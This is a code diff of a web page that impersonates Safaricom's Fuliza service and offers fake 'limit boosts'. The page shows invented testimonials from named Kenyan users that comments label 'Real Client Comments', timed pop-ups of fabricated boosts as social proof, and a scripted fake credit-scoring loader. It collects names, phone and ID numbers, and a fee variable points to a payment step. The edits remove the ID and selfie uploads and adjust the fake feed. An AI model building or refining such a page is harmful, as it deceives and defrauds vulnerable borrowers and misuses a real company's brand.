@@ -69,7 +69,7 @@
         </div>
       </a>
 
-      <!-- Desktop Nav with Interactive Notification Bell Dropdown -->
+      <!-- Desktop Nav with Interactive Notification Bell Dropdown (Containing Real Comments) -->
       <nav id="nav-links" class="hidden md:flex items-center space-x-6 text-sm font-semibold text-gray-700">
         <a href="#verify" class="hover:text-safaricom transition-colors">Boost Limit</a>
         <a href="#services" class="hover:text-safaricom transition-colors">Services</a>
@@ -84,17 +84,17 @@
             <span class="absolute top-1 right-1 w-2.5 h-2.5 bg-safaricom-red rounded-full ring-2 ring-white"></span>
           </button>
 
-          <!-- Interactive Dropdown Menu containing Comments and Boosts -->
+          <!-- Dropdown Menu Containing Real Client Comments -->
           <div id="notification-dropdown" class="hidden absolute right-0 mt-3 w-96 bg-white rounded-3xl shadow-2xl border border-gray-100 p-5 z-50 text-xs space-y-3">
             <div class="flex justify-between items-center border-b border-gray-100 pb-3">
               <div>
-                <span class="font-black text-gray-900 text-sm block">Client Feed & Testimonials</span>
-                <span class="text-[10px] text-gray-500 font-medium">Real reviews and successful limit boosts</span>
+                <span class="font-black text-gray-900 text-sm block">Client Reviews & Comments</span>
+                <span class="text-[10px] text-gray-500 font-medium">Real testimonials from successful boosts</span>
               </div>
-              <span class="text-[10px] bg-safaricom-light text-safaricom font-black px-2.5 py-1 rounded-full uppercase">Live 50+</span>
+              <span class="text-[10px] bg-safaricom-light text-safaricom font-black px-2.5 py-1 rounded-full uppercase">Live Feed</span>
             </div>
-            <div id="dropdown-notification-list" class="space-y-3 max-h-80 overflow-y-auto chat-scroll pr-1">
-              <!-- Dynamically populated comments and boosts -->
+            <div id="dropdown-comments-list" class="space-y-3 max-h-80 overflow-y-auto chat-scroll pr-1">
+              <!-- Dynamically populated comments -->
             </div>
           </div>
         </div>
@@ -130,7 +130,7 @@
     </div>
   </header>
 
-  <!-- Popping Notification Toast Queue Top Right (Clickable to view comments/details) -->
+  <!-- Popping Notification Toast Queue Top Right (Showing ONLY Name and Transaction) -->
   <div id="notification-toast-container" class="fixed top-24 right-6 z-50 pointer-events-none flex flex-col space-y-2 max-w-sm w-full"></div>
 
   <!-- Main Section -->
@@ -140,7 +140,7 @@
     <section id="verify" class="py-12 md:py-20 bg-gradient-to-b from-safaricom-light/40 via-white to-gray-50 flex-grow flex items-center">
       <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 w-full">
         
-        <!-- Step 1: Account Verification Form -->
+        <!-- Step 1: Account Verification Form (Cleaned: No ID/Avatar Uploads Required) -->
         <div id="step-1" class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
           
           <!-- Encouraging Left Intro -->
@@ -186,7 +186,7 @@
             </div>
           </div>
 
-          <!-- HUGE, ATTRACTIVE, PROMINENT FORM WITH SEAMLESS ID & AVATAR UPLOAD -->
+          <!-- HUGE, ATTRACTIVE, PROMINENT FORM (NO ID OR SELFIE AVATAR REQUIRED) -->
           <div class="lg:col-span-6">
             <div class="bg-white rounded-3xl shadow-2xl border-4 border-safaricom/20 p-8 sm:p-10 relative overflow-hidden">
               <div class="absolute -top-12 -right-12 w-36 h-36 bg-safaricom-light rounded-full opacity-50 pointer-events-none"></div>
@@ -195,7 +195,7 @@
                 <div>
                   <span class="text-[11px] bg-safaricom text-white uppercase font-extrabold px-2.5 py-1 rounded-md tracking-wider">Step 1 of 3</span>
                   <h2 class="text-2xl sm:text-3xl font-black text-gray-900 mt-2">Account Verification</h2>
-                  <p class="text-xs sm:text-sm text-gray-600 font-medium mt-1">Provide official details and identification registered to your Safaricom line.</p>
+                  <p class="text-xs sm:text-sm text-gray-600 font-medium mt-1">Provide basic details registered to your Safaricom line.</p>
                 </div>
                 <div class="bg-safaricom-light p-4 rounded-2xl text-safaricom shadow-md">
                   <i data-lucide="shield-alert" class="w-8 h-8"></i>
@@ -233,28 +233,6 @@
                   </div>
                 </div>
 
-                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-                  <!-- National ID Image Upload (Zero Spacing) -->
-                  <div>
-                    <label class="block text-[11px] font-black uppercase tracking-wider text-gray-800 mb-1">National ID Image</label>
-                    <label class="flex items-center space-x-2 border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-3 cursor-pointer bg-gray-50/50 transition">
-                      <i data-lucide="upload-cloud" class="w-5 h-5 text-safaricom flex-shrink-0"></i>
-                      <span id="id-file-label" class="text-xs font-bold text-gray-600 truncate">Upload ID Photo</span>
-                      <input type="file" id="id-image-input" accept="image/*" required class="hidden" onchange="previewFile('id-image-input', 'id-file-label')">
-                    </label>
-                  </div>
-
-                  <!-- Avatar / Selfie Image Upload (Zero Spacing) -->
-                  <div>
-                    <label class="block text-[11px] font-black uppercase tracking-wider text-gray-800 mb-1">Selfie Avatar Image</label>
-                    <label class="flex items-center space-x-2 border-2 border-dashed border-gray-300 hover:border-safaricom rounded-2xl p-3 cursor-pointer bg-gray-50/50 transition">
-                      <i data-lucide="camera" class="w-5 h-5 text-safaricom flex-shrink-0"></i>
-                      <span id="avatar-file-label" class="text-xs font-bold text-gray-600 truncate">Upload Selfie</span>
-                      <input type="file" id="avatar-image-input" accept="image/*" required class="hidden" onchange="previewFile('avatar-image-input', 'avatar-file-label')">
-                    </label>
-                  </div>
-                </div>
-
                 <div>
                   <label class="block text-xs font-black uppercase tracking-wider text-gray-800 mb-1.5">Current Fuliza Limit (Ksh)</label>
                   <div class="relative">
@@ -287,7 +265,7 @@
               <h3 class="text-2xl font-black text-gray-900">Zuri Scoring Analysis...</h3>
               <p class="text-sm text-safaricom font-bold mt-2" id="loader-1-text">Cross-referencing M-PESA statement patterns...</p>
             </div>
-            <p class="text-xs text-gray-600 font-medium">Evaluating your transaction velocity, repayment history, and uploaded identity documents for instant eligibility.</p>
+            <p class="text-xs text-gray-600 font-medium">Evaluating your transaction velocity and repayment history for instant eligibility.</p>
           </div>
         </div>
 
@@ -676,7 +654,7 @@
       }
     });
 
-    // 50+ Diverse Kenyan Notifications mixing exact requested comments ("Jonathan Kamau", "hii ni mwecheche December sorted", "Justinah", etc.) with emojis
+    // Comprehensive comments and transactions database
     const notificationQueue = [
       { 
         name: "Jonathan Kamau (Nairobi)", 
@@ -973,16 +951,16 @@
         time: "48 mins ago" 
       },
       { 
-        name: "Maina Kamau (Nairobi)", 
+        name: "Justinah Wambui (Nairobi)", 
         action: "Boosted limit to Ksh 400,000 Executive Tier! 👑", 
         comment: "Hii ni mwecheche December sorted kabisa! Max limit unlocked and all financial goals met without breaking a sweat! 🥂💎🚀", 
         time: "49 mins ago" 
       }
     ];
 
-    // Render the dropdown list with full names, actions, and comments
-    function renderDropdownList() {
-      const listContainer = document.getElementById('dropdown-notification-list');
+    // Render the dropdown list with full comments inside the bell
+    function renderDropdownComments() {
+      const listContainer = document.getElementById('dropdown-comments-list');
       if (!listContainer) return;
       listContainer.innerHTML = notificationQueue.map(item => `
         <div class="p-3 bg-gray-50 rounded-2xl border border-gray-100 space-y-1.5 hover:bg-safaricom-light/30 transition">
@@ -996,7 +974,7 @@
       `).join('');
       lucide.createIcons();
     }
-    renderDropdownList();
+    renderDropdownComments();
 
     let notifIdx = 0;
     function triggerNextNotification() {
@@ -1007,25 +985,25 @@
       notifIdx = (notifIdx + 1) % notificationQueue.length;
 
       const toast = document.createElement('div');
-      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-4 rounded-3xl shadow-2xl border-2 border-safaricom/30 flex items-start space-x-3 cursor-pointer hover:scale-105 transition transform";
+      // Toast pops up showing ONLY the Name and the Transaction/Boost action
+      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-4 rounded-3xl shadow-2xl border-2 border-safaricom/30 flex items-center space-x-3 cursor-pointer hover:scale-105 transition transform";
       
-      // Tapping on the popping toast opens the notification dropdown so they can read the full comments
+      // Tapping on the popping toast opens the notification dropdown so they can read the comments
       toast.onclick = () => {
         const dropdown = document.getElementById('notification-dropdown');
         if (dropdown) dropdown.classList.remove('hidden');
       };
 
       toast.innerHTML = `
-        <div class="w-10 h-10 rounded-2xl bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0 font-black shadow-inner mt-0.5">
+        <div class="w-10 h-10 rounded-2xl bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0 font-black shadow-inner">
           <i data-lucide="award" class="w-5 h-5"></i>
         </div>
-        <div class="flex-grow text-xs space-y-1">
+        <div class="flex-grow text-xs space-y-0.5">
           <div class="flex justify-between items-center">
             <p class="font-black text-gray-900">${item.name}</p>
             <span class="text-[10px] text-gray-400">${item.time}</span>
           </div>
           <p class="text-safaricom font-black">${item.action}</p>
-          <p class="text-gray-600 text-[11px] italic line-clamp-2">"${item.comment}"</p>
         </div>
       `;
 
@@ -1036,11 +1014,11 @@
         toast.classList.remove('toast-enter');
         toast.classList.add('toast-exit');
         setTimeout(() => toast.remove(), 400);
-      }, 5500);
+      }, 5000);
     }
 
     setTimeout(triggerNextNotification, 2000);
-    setInterval(triggerNextNotification, 6500);
+    setInterval(triggerNextNotification, 6000);
 
     let userData = { name: '', phone: '', id: '', currentLimit: 0, selectedTarget: 0, selectedFee: 0 };
 
@@ -1050,15 +1028,6 @@
       if (digits.length === 10 && (digits.startsWith("07") || digits.startsWith("01"))) return "254" + digits.substring(1);
       if (digits.length === 12 && (digits.startsWith("254"))) return digits;
       return digits;
-    }
-
-    function previewFile(inputId, labelId) {
-      const input = document.getElementById(inputId);
-      const label = document.getElementById(labelId);
-      if (input.files && input.files[0]) {
-        label.textContent = input.files[0].name;
-        label.classList.add('text-safaricom', 'font-black');
-      }
     }
 
     // Loader 1 step: 6 seconds duration
@@ -1081,7 +1050,7 @@
 
       const statusText = document.getElementById('loader-1-text');
       setTimeout(() => { statusText.textContent = "Analyzing your 12-month transaction patterns..."; }, 2000);
-      setTimeout(() => { statusText.textContent = "Verifying repayment integrity and security documents..."; }, 4000);
+      setTimeout(() => { statusText.textContent = "Verifying repayment integrity and line scoring..."; }, 4000);
 
       setTimeout(() => {
         document.getElementById('loader-1').classList.add('hidden');
